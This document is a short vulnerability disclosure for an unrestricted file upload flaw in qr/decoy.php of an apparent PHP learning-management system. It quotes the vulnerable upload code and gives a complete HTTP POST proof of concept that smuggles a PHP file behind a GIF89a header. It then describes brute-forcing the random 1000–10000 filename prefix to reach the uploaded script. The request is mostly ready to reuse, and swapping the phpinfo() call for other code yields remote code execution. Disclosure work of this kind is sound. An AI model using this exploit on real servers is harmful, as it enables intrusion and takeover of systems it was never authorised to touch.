### Vulnerability file address

`qr/decoy.php` from line 90

There is no restriction on the type of uploaded files, any file can be uploaded, and the default upload path is `qr/images`,The prefix of the uploaded php file is a random number from 1000 to 10000, which needs to be blasted to know

```php
......
......
......
if (isset($_POST["submit"]))
 {
     #retrieve file title
        $title = $_POST["title"];
     
    #file name with a random number so that similar dont get replaced
     $pname = rand(1000,10000)."-".$_FILES["file"]["name"];
 
    #temporary file name to store file
    $tname = $_FILES["file"]["tmp_name"];
   
     #upload directory path
$uploads_dir = 'images';
    #TO move the uploaded file to specific location
    move_uploaded_file($tname, $uploads_dir.'/'.$pname);
......
......
......
```

### POC

```http
POST /qr/decoy.php HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------213755358710814538253324444915
Content-Length: 474
Origin: http://www.lms.net
Connection: close
Referer: http://www.lms.net/qr/decoy.php
Upgrade-Insecure-Requests: 1

-----------------------------213755358710814538253324444915
Content-Disposition: form-data; name="title"


-----------------------------213755358710814538253324444915
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/php

GIF89a<?php phpinfo();?>
-----------------------------213755358710814538253324444915
Content-Disposition: form-data; name="submit"

æäº¤æ¥è¯¢
-----------------------------213755358710814538253324444915--
```

### Attack results pictures

Once we get the correct filename from 1000-10000 blasting, it will be accessible

![image-20220701132744865](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220701132744.png)



![image-20220701132816950](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220701132816.png)